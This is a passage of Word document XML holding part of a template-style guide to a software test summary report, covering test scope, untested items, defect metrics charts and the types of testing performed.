          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="843" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>In Scope</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="122"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="844" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="845" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Out of Scope</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="122"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="846" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="847" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Items not tested</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="848" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="849" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">&lt;This section explains about the functions/modules in scope &amp; out of scope for testing; </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Any</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> items which are not tested due to any constraints/dependencies/restrictions&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="850" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="851" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Example:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> A functionality verification which needs connectivity to a third party application cannot be tested, as the connectivity could not be established due to some technical limitations. This section should be clearly </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>documented,</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> else it will be assumed that Testing covered all areas of the application.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="852" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="853" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>a) In Scope</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
          <w:t>Functional Testing for the following modules are in Scope of Testing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="123"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="854" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="855" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Registration</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="123"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="856" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="857" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Booking</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="123"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="858" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="859" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Payment</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="860" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="861" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>b) Out of Scope</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
          <w:t>Performance Testing was not done for this application.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="862" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="863" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>c) Items not tested</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
          <w:t>Verification of connectivity with the third party system ‘Central repository system’ was not tested, as the connectivity could not be established due to some technical limitations. This can be verified during UAT (User Acceptance Testing) where the connectivity is available or can be established.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="864" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="865" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Step #4: Metrics</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="866" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="867" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>&lt;Metrics will help to understand the test execution results, status of test cases &amp; defects etc. Required Metrics can be added as necessary. Example: Defect Summary-Severity wise; Defect Distribution-Function/Module wise; Defect Ageing etc</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>..</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> Charts/Graphs can be attached for better visual representation&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="868" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="869" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>a</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">) No. of test cases planned </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>vs</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> executed</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>b) No. of test cases passed/failed</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="870" w:author="Unknown"/>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1ED0DF7D" wp14:editId="4E1A9135">
            <wp:extent cx="3797935" cy="642620"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="38" name="Picture 38" descr="test summary report 1">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 summary report 1">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7935" cy="642620"/>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871" w:author="Unknown"/>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14:anchorId="25027567" wp14:editId="6A5EC1DD">
            <wp:extent cx="3361055" cy="2125345"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="39" name="Picture 39" descr="test summary report 2">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 summary report 2">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055" cy="212534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872" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="873" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>c) No of defects identified and their Status &amp; Severity</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="874" w:author="Unknown"/>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530DA82E" wp14:editId="4DF9C341">
            <wp:extent cx="3945890" cy="889635"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="40" name="Picture 40" descr="test summary report 3">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t summary report 3">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45890" cy="88963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875" w:author="Unknown"/>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66A05764" wp14:editId="30457B70">
            <wp:extent cx="3583305" cy="2644140"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="41" name="Picture 41" descr="test summary report 4">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summary report 4">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3305" cy="2644140"/>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876" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="877" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>d) Defects distribution – module wise</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="878" w:author="Unknown"/>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54AAF1BA" wp14:editId="3D084F7A">
            <wp:extent cx="4258945" cy="1260475"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="42" name="Picture 42" descr="test summary report 5">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 summary report 5">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58945" cy="126047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879" w:author="Unknown"/>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14:anchorId="11EE6717" wp14:editId="01F58C31">
            <wp:extent cx="4036695" cy="2479675"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="43" name="Picture 43" descr="test summary report 6">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summary report 6">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6695" cy="247967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369" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="880" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="881" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="882" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="883" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Step #5: Types of testing performed</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="884" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="885" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="124"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="886" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="887" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Smoke Testing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="124"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="888" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="889" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>System Integration Testing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="124"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="890" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="891" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/regression-testing-tools-and-methods/" \o "What is regression testing" </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="777777"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>and Regression Testing</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="892" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="893" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
